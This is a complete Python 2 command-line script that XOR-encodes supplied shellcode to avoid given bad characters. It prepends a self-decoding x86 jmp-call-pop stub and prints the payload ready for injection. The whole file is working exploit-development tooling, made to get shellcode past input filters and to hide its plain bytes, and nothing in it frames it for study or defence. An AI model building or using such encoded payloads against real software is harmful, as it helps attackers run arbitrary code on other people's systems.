#!/usr/bin/python
# Python XOR Encoder

import sys

# Attempting to find proper XOR key to hide bad chars
def find_key(plain_bytes, bad_bytes):
    for key in range(0, 256):
        suitable = True

        if key in plain_bytes:
            continue

        for plain_byte in plain_bytes:
            encoded_byte = plain_byte ^ key

            if encoded_byte in bad_bytes:
                suitable = False
                break
            else:
                suitable_key = key

        if suitable:
            return key

    return -1

if len(sys.argv) < 2:
    print "./encoder.py shellcode badchars"

shellcode = sys.argv[1].decode('string-escape')
bad_chars = sys.argv[2].decode('string-escape')

encoded_c = ""

plain_bytes = bytearray(shellcode)
shellcode_length = len(plain_bytes)

bad_bytes = bytearray(bad_chars)


print ""
key = find_key(plain_bytes, bad_bytes)

if key < 0:
    print "Cannot find suitable XOR key!"
else:
    print "Suitable key found: \\x%02x" % key

for plain_byte in plain_bytes:
    encoded_byte = plain_byte ^ key
    
    encoded_c += '\\x'
    encoded_c += '%02x' % encoded_byte
    

stub = "\\xeb\\x0d\\x5e\\x31\\xc9\\xb1" + "\\x%02x" % shellcode_length + "\\x80\\x36" + "\\x%02x" % key + "\\x46\\xe2\\xfa\\xeb\\x05\\xe8\\xee\\xff\\xff\\xff" + encoded_c

print "Encoded: \"" + stub + "\""
